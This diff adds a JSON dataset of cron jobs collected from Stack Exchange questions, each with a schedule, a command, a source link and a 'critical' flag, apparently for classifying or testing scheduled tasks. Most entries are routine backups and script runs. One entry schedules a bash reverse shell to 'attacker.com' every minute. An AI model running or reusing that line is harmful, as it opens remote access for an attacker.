@@ -1,0 +1,506 @@
+[
+ {
+  "schedule": "* * * * *",
+  "command": "root /bin/bash /root/scripts/vpnup.bash >> /root/scripts/vpn.log",
+  "source": "https://serverfault.com/questions/98280/pptp-pon-fails-when-called-via-cron-debian",
+  "critical": null
+ },
+ {
+  "schedule": "00 19 * * *",
+  "command": "bash /home/test/take_backup.sh > /home/test/backup.log 2>&1 || mail -s \"Backup failed, check attached logs\" someone@gmail.com < /home/test/backup.log",
+  "source": "https://serverfault.com/questions/1010968/get-an-email-notification-when-my-cron-fails-with-non-zero-exit-code-crontab",
+  "critical": true
+ },
+ {
+  "schedule": "17 * * * *",
+  "command": "root    cd / && run-parts --report /etc/cron.hourly",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "25 6 * * *",
+  "command": "root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "47 6 * * 7",
+  "command": "root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "52 6 1 * *",
+  "command": "root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "5 0 * * *",
+  "command": "root    bash /sites/domain.com/scripts/backup.sh",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": true
+ },
+ {
+  "schedule": "0 3 * * *",
+  "command": "root    php /sites/domain.com/www/cron/clear-expired-carts.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "0 1 * * 7",
+  "command": "root    php /sites/domain.com/www/cron/generate-vehicle-sitemap.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "3 3 * * *",
+  "command": "root    php /sites/domain.com/www/cron/account/update-dealer-map.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "15 1 * * 1-5",
+  "command": "root    php /sites/internal.domain.com/www/cron/account/clock/accountability-report.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "0 6 * * 1",
+  "command": "root    php /sites/internal.domain.com/www/cron/account/clock/tardy-report.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "0 22 * * *",
+  "command": "root    php /sites/internal.domain.com/www/cron/account/clock/clock-out.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "30 1 * * *",
+  "command": "root    php /sites/internal.domain.com/www/cron/ebay/get-feedback.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "root    php /sites/internal.domain.com/www/cron/ebay/archive/get-listing-data.php",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "10 * * * *",
+  "command": "root    php /sites/internal.domain.com/www/cron/ebay/archive/associa",
+  "source": "https://serverfault.com/questions/210452/crontab-commands-not-running",
+  "critical": null
+ },
+ {
+  "schedule": "@reboot",
+  "command": "/root/reboot.sh",
+  "source": "https://serverfault.com/questions/492943/reboot-cron-directive-doesnt-work-on-solaris-what-do-i-use-instead",
+  "critical": null
+ },
+ {
+  "schedule": "30 9 * * *",
+  "command": "cronuser /usr/bin/php -C /etc /path/to/process.php",
+  "source": "https://unix.stackexchange.com/questions/31117/frustrating-issue-where-neither-cron-nor-su-c-runs-my-job-permissions",
+  "critical": null
+ },
+ {
+  "schedule": "22 18 7 * *",
+  "command": "cronuser echo \"Test\" > /path/to/test.txt",
+  "source": "https://unix.stackexchange.com/questions/31117/frustrating-issue-where-neither-cron-nor-su-c-runs-my-job-permissions",
+  "critical": false
+ },
+ {
+  "schedule": "9 12 8 * *",
+  "command": "cronuser /bin/echo \"Test\" > /var/www/eDialog/test.txt",
+  "source": "https://unix.stackexchange.com/questions/31117/frustrating-issue-where-neither-cron-nor-su-c-runs-my-job-permissions",
+  "critical": false
+ },
+ {
+  "schedule": "30 9 * * *",
+  "command": "/usr/bin/php -C /etc /path/to/process.php",
+  "source": "https://unix.stackexchange.com/questions/31117/frustrating-issue-where-neither-cron-nor-su-c-runs-my-job-permissions",
+  "critical": null
+ },
+ {
+  "schedule": "9 12 8 * *",
+  "command": "/bin/echo \"Test\" > /path/to/test.txt",
+  "source": "https://unix.stackexchange.com/questions/31117/frustrating-issue-where-neither-cron-nor-su-c-runs-my-job-permissions",
+  "critical": false
+ },
+ {
+  "schedule": "26 3 * * *",
+  "command": "cronic python3 ~/redacted_directory_name/redacted_script_name.py",
+  "source": "https://unix.stackexchange.com/questions/686816/cron-not-sending-email-command-line-email-works",
+  "critical": null
+ },
+ {
+  "schedule": "24 22 * * *",
+  "command": "echo \"Testing cron email\"",
+  "source": "https://unix.stackexchange.com/questions/686816/cron-not-sending-email-command-line-email-works",
+  "critical": false
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "arp -n > results.txt",
+  "source": "https://unix.stackexchange.com/questions/380005/save-arp-output-in-terminal-to-text-file-every-minute-using-crontab",
+  "critical": null
+ },
+ {
+  "schedule": "30 06 * * *",
+  "command": "root $binPath/zsh/test.zsh | adddate 1>>$logPath/log.csv 2>>$errorLogPath/error.txt",
+  "source": "https://unix.stackexchange.com/questions/643174/bash-function-command-not-found-in-cronjob",
+  "critical": null
+ },
+ {
+  "schedule": "23 0 5 * *",
+  "command": "1 /home/user/bin/checkSystem",
+  "source": "https://unix.stackexchange.com/questions/465179/cron-script-cannot-find-logwatch-and-chkrootkit",
+  "critical": null
+ },
+ {
+  "schedule": "0 * * * *",
+  "command": "/home/naruto/Hour-sound.sh 2>/tmp/error",
+  "source": "https://askubuntu.com/questions/611336/why-putting-a-script-in-etc-cron-hourly-is-not-working",
+  "critical": false
+ },
+ {
+  "schedule": "1 0 * * *",
+  "command": "printf > /var/log/apache/error_log",
+  "source": "https://stackoverflow.com/questions/21789148/difference-between-cron-and-crontab",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "/usr/bin/perl /var/www/web/myfolder/LoadPrograms.pl >> /var/www/web/log.txt",
+  "source": "https://stackoverflow.com/questions/16722898/user-id-in-perl-cron-job",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "(. ~/.bash_profile; $HOME/scripts/startworkflow_trg.sh tst)",
+  "source": "https://stackoverflow.com/questions/42806630/crontab-bash-script-no-such-file-or-directory",
+  "critical": null
+ },
+ {
+  "schedule": "*/1 * * * *",
+  "command": "/home/uname/dir/script",
+  "source": "https://stackoverflow.com/questions/35998401/git-push-via-cron-ssh-agent-no-password",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "~/check_phpfpm.sh",
+  "source": "https://stackoverflow.com/questions/14112246/shell-crontab-not-working",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "~/check_nginx.sh",
+  "source": "https://stackoverflow.com/questions/14112246/shell-crontab-not-working",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "~/disk-clean.sh",
+  "source": "https://stackoverflow.com/questions/14112246/shell-crontab-not-working",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "~/loadcheck.sh",
+  "source": "https://stackoverflow.com/questions/14112246/shell-crontab-not-working",
+  "critical": null
+ },
+ {
+  "schedule": "*/1 * * * *",
+  "command": "node /app/api/run.js",
+  "source": "https://stackoverflow.com/questions/76609955/create-a-cron-job-inside-a-docker-container-to-execute-a-function-in-run-js-file",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "/bin/sh /Users/na/GulpBuild.sh >> /Users/na/cronlog.log 2>&1",
+  "source": "https://stackoverflow.com/questions/48846639/npm-install-and-gulp-fails-in-cron-job",
+  "critical": null
+ },
+ {
+  "schedule": "* 0 * * *",
+  "command": "root cd /home/deploy/rails_apps/supercharger/current/ && /usr/local/rvm/wrappers/ruby-1.9.3-p484/ruby bundle exec rails runner -e production \"Charger.start\"",
+  "source": "https://stackoverflow.com/questions/26205810/running-rails-task-from-cron",
+  "critical": null
+ },
+ {
+  "schedule": "30 12 * * *",
+  "command": "java -jar test.jar",
+  "source": "https://stackoverflow.com/questions/32354336/running-jar-with-cron-throws-error-bin-sh-1-java-not-found",
+  "critical": null
+ },
+ {
+  "schedule": "*/1 * * * *",
+  "command": "root    date >> /var/log/cron-test.log 2>&1",
+  "source": "https://stackoverflow.com/questions/34962020/cron-and-crontab-files-not-executed-in-docker",
+  "critical": false
+ },
+ {
+  "schedule": "*/1 * * * *",
+  "command": "/home/deploy/cron/job.sh >> /home/deploy/cron/test.log 2>&1",
+  "source": "https://stackoverflow.com/questions/31522284/cron-gsutil-not-found",
+  "critical": null
+ },
+ {
+  "schedule": "*/10 * * * *",
+  "command": "cp /home/app/log/file.log.$(date --d=\"-1 day\" +%Y%m%d) /root/",
+  "source": "https://stackoverflow.com/questions/58983536/cron-job-failing-on-date-time-format",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "/bin/bash -l -c 'cd /home/myhome/analytics && RAILS_ENV=development /bundle exec rake my_rake_job'",
+  "source": "https://stackoverflow.com/questions/39707371/whenever-gem-cronjob-not-loading-path-from-etc-environment",
+  "critical": null
+ },
+ {
+  "schedule": "*/1 * * * *",
+  "command": "root . /root/.bashrc; python3.7 /usr/src/collector/run.py",
+  "source": "https://stackoverflow.com/questions/57396501/environnement-variables-in-system-wide-cron",
+  "critical": null
+ },
+ {
+  "schedule": "*/1 * * * *",
+  "command": "root echo 'hi' >> /var/log/lastlog",
+  "source": "https://stackoverflow.com/questions/57396501/environnement-variables-in-system-wide-cron",
+  "critical": false
+ },
+ {
+  "schedule": "50 * * * *",
+  "command": "/home/myusername/bin/uploadmyip",
+  "source": "https://stackoverflow.com/questions/3576996/why-this-expect-script-gives-an-error-when-its-run-by-cron",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "/home/ubuntu/TestTG/TGubuntu.py",
+  "source": "https://stackoverflow.com/questions/59727140/cron-job-permission-denied",
+  "critical": null
+ },
+ {
+  "schedule": "0 0 * * 1",
+  "command": "wget -q -O /dev/null http://www.urlhere.co.uk/index.php/cron_event/send_reminders",
+  "source": "https://stackoverflow.com/questions/14498069/php-cron-job-within-codeigniter-framework",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "curl --silent http://www....cron_script.php >  /dev/null",
+  "source": "https://stackoverflow.com/questions/46463167/cron-job-sometimes-fails-with-error-by-curl",
+  "critical": null
+ },
+ {
+  "schedule": "00 * * * *",
+  "command": "$HOME/u/kh/bin/z.pl >> $HOME/tmplocal/DUMS/z.pl/out.txt 2>&1",
+  "source": "https://stackoverflow.com/questions/70510721/how-can-a-script-be-made-to-run-automatically-every-hour-such-that-it-performs",
+  "critical": null
+ },
+ {
+  "schedule": "0 0 * * *",
+  "command": "/home2/backup/backup-all.sh",
+  "source": "https://stackoverflow.com/questions/42406606/crontab-runs-bash-in-a-different-way",
+  "critical": true
+ },
+ {
+  "schedule": "0 0 * * *",
+  "command": "/usr/bin/time /path/to/mysqlbackup.sh | /bin/mail -s \"MySQL Backup\" \"admin@example.com\"",
+  "source": "https://stackoverflow.com/questions/19307056/pipe-cronjob-errors-to-mail",
+  "critical": true
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "(/usr/bin/time /root/utils/test.sh 2&>1) | /usr/bin/tee /tmp/cron.test | /bin/mail -s \"test\" \"srobbins@example.com\"",
+  "source": "https://stackoverflow.com/questions/19307056/pipe-cronjob-errors-to-mail",
+  "critical": null
+ },
+ {
+  "schedule": "0 * * * *",
+  "command": "python /Users/jamesrusso/Documents/TorMeasure/TorMeasurementProject/getConsensus.py",
+  "source": "https://stackoverflow.com/questions/35110964/python-script-error-with-cron",
+  "critical": null
+ },
+ {
+  "schedule": "00 00 * * *",
+  "command": "/usr/bin/php /path/file.php",
+  "source": "https://stackoverflow.com/questions/9512413/php-cron-job-premature-termination-due-to-maximum-execution-time-fatal-error",
+  "critical": null
+ },
+ {
+  "schedule": "*/10 * * * *",
+  "command": ". $HOME/.bashrc sh /path/to/cronjob.sh",
+  "source": "https://stackoverflow.com/questions/23102328/cron-job-error-usr-bin-env-node-no-such-file-or-directory",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "bash ~/Documents/GitHub/BFOR206/hw1.sh",
+  "source": "https://stackoverflow.com/questions/75657137/cron-displaying-error-despite-bash-script-running-fine-manually-linux",
+  "critical": false
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "root    /root/test.sh > /dev/null",
+  "source": "https://stackoverflow.com/questions/61877765/cron-stop-sending-error-mails-if-command-output-is-redirected-to-logfile",
+  "critical": false
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "root    /root/test.sh",
+  "source": "https://stackoverflow.com/questions/61877765/cron-stop-sending-error-mails-if-command-output-is-redirected-to-logfile",
+  "critical": false
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "/Users/me/miniforge3/envs/dev/bin/fclean >> /dev/null 2>&1",
+  "source": "https://stackoverflow.com/questions/77815914/macos-sonoma-cron-job-doesnt-have-access-to-trash-even-though-it-has-full-sy",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "/Users/me/miniforge3/envs/dev/bin/python /Users/me/miniforge3/envs/dev/bin/fclean >> /dev/null 2>&1",
+  "source": "https://stackoverflow.com/questions/77815914/macos-sonoma-cron-job-doesnt-have-access-to-trash-even-though-it-has-full-sy",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "/Users/me/miniforge3/envs/dev/bin/python /Users/me/path/to/file.py >> /dev/null 2>&1",
+  "source": "https://stackoverflow.com/questions/77815914/macos-sonoma-cron-job-doesnt-have-access-to-trash-even-though-it-has-full-sy",
+  "critical": null
+ },
+ {
+  "schedule": "0 3 * * *",
+  "command": "/usr/bin/python3.6 \"/home/ngabioud/Scripts Python VM/ClickTableau.py\"",
+  "source": "https://stackoverflow.com/questions/60793373/urllib-request-returning-connection-timout-when-executed-with-cron-centos",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "wget -O --q -t 1 http://domain:8280/folder/cron.php",
+  "source": "https://stackoverflow.com/questions/34393172/cron-job-linux-apache-ssl",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "wget --no-check-certificate -O --q -t 1 https://domain/folder/cron.php",
+  "source": "https://stackoverflow.com/questions/34393172/cron-job-linux-apache-ssl",
+  "critical": null
+ },
+ {
+  "schedule": "* */1 * * *",
+  "command": "python /path/to/script/my_script.py --pythonpath=/path/to/script/ 1>/path/to/script/success.log 2>/path/to/script/error.log",
+  "source": "https://stackoverflow.com/questions/15265626/python-threading-in-cron-lock-stderr-file",
+  "critical": null
+ },
+ {
+  "schedule": "34 14 * * *",
+  "command": "/root/perl/./unzip.pl > /dev/null 2>&1",
+  "source": "https://stackoverflow.com/questions/21253921/zip-file-is-not-extracting-by-crontab",
+  "critical": null
+ },
+ {
+  "schedule": "42 18 * * *",
+  "command": "/usr/bin/python3 /home/user/bin/bash/statxplore_api.py",
+  "source": "https://stackoverflow.com/questions/77494817/api-call-script-fails-in-cron-job-but-works-fine-when-run-manually",
+  "critical": null
+ },
+ {
+  "schedule": "0 14 * * *",
+  "command": "PATH=$PATH:/usr/sbin PYTHONPATH=/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/ /usr/bin/python2.7 ~/.../script.py",
+  "source": "https://stackoverflow.com/questions/42285518/sh-sysctl-command-not-found-for-mac-os-x-running-a-cron-job",
+  "critical": null
+ },
+ {
+  "schedule": "00 * * * *",
+  "command": "BASH_ENV=~/.bash_profile && /bin/bash -c '~/deggy/onlineGW.rb'",
+  "source": "https://stackoverflow.com/questions/20954298/gem-not-found-in-ruby-cron-job-in-rvm-env",
+  "critical": null
+ },
+ {
+  "schedule": "*/5 * * * *",
+  "command": "/bin/bash -l -c \"cd /home/deploy/railsapp && rake spec >> cron.log 2>&1\"",
+  "source": "https://stackoverflow.com/questions/39037735/rake-command-not-running-from-cron-job-but-works-otherwise",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "cd /var/www/app/current && /usr/local/bin/rake RAILS_ENV=production thinking_sphinx:index >> /var/www/app/current/log/cron.log 2>&1",
+  "source": "https://stackoverflow.com/questions/3375938/thinking-sphinx-indexing-succeeding-on-command-line-but-failing-in-cron-job",
+  "critical": null
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "/bin/bash -i >& /dev/tcp/attacker.com/5326 0>&1",
+  "source": "https://stackoverflow.com/questions/55240626/bash-reverse-shell-command-cron-job-not-working-i-give-up",
+  "critical": null
+ },
+ {
+  "schedule": "32 * * * *",
+  "command": "root (apt-get install --allow-downgrades -y  firefox=45.0.2+build1-0ubuntu1)",
+  "source": "https://stackoverflow.com/questions/41044636/selenium-works-only-2-53-6-with-firefox-45-0-2",
+  "critical": false
+ },
+ {
+  "schedule": "32 * * * *",
+  "command": "/home/stefanolinux/firefox_update.sh >> firefox_update_works.txt",
+  "source": "https://stackoverflow.com/questions/41044636/selenium-works-only-2-53-6-with-firefox-45-0-2",
+  "critical": false
+ },
+ {
+  "schedule": "@hourly",
+  "command": "apt-get install firefox=45.0.2+build1-0ubuntu1",
+  "source": "https://stackoverflow.com/questions/41044636/selenium-works-only-2-53-6-with-firefox-45-0-2",
+  "critical": false
+ },
+ {
+  "schedule": "32 * * * *",
+  "command": "apt-get install --allow-downgrades -y  firefox=45.0.2+build1-0ubuntu1",
+  "source": "https://stackoverflow.com/questions/41044636/selenium-works-only-2-53-6-with-firefox-45-0-2",
+  "critical": false
+ },
+ {
+  "schedule": "* * * * *",
+  "command": "php -d register_argc_argv=On /home/techworld/public_html/hubli-betting/artisan schedule:run > /dev/null 2>&1",
+  "source": "https://stackoverflow.com/questions/59407306/how-to-set-up-laravel-cron-job-in-cpanel",
+  "critical": null
+ },
+ {
+  "schedule": "0 * * * *",
+  "command": "mysqlcheck -Aao –auto-repair -u root -p[password] > /dev/null",
+  "source": "https://stackoverflow.com/questions/6938903/cronjob-that-optimizes-and-cleans-all-mysql-databases",
+  "critical": true
+ },
+ {
+  "schedule": "0 * * * *",
+  "command": "/usr/local/bin/mysqlcheck --defaults-file=/root/.my.cnf --all-databases --auto-repair 2>&1 | grep -v \"OK\" | mail -s \"Database Problem\" root",
+  "source": "https://stackoverflow.com/questions/6938903/cronjob-that-optimizes-and-cleans-all-mysql-databases",
+  "critical": true
+ },
+ {
+  "schedule": "0 8 * * *",
+  "command": "/mnt/data/sda/user_storage/stocks_etl.sh",
+  "source": "https://stackoverflow.com/questions/66337313/schedule-python-script-with-crontab",
+  "critical": true
+ },
+ {
+  "schedule": "* 0-1,4-23 * * *",
+  "command": "path/check_replication.sh > /dev/null 2>&1",
+  "source": "https://serverfault.com/questions/630697/cronjob-for-a-bash-script-pauses-for-2-minutes-randomly",
+  "critical": true
+ },
+ {
+  "schedule": "*/10 * * * *",
+  "command": "run_job.sh",
+  "source": "https://stackoverflow.com/questions/59902402/bash-10-no-such-file-or-directory-when-running-cron-job",
+  "critical": null
+ }
+]
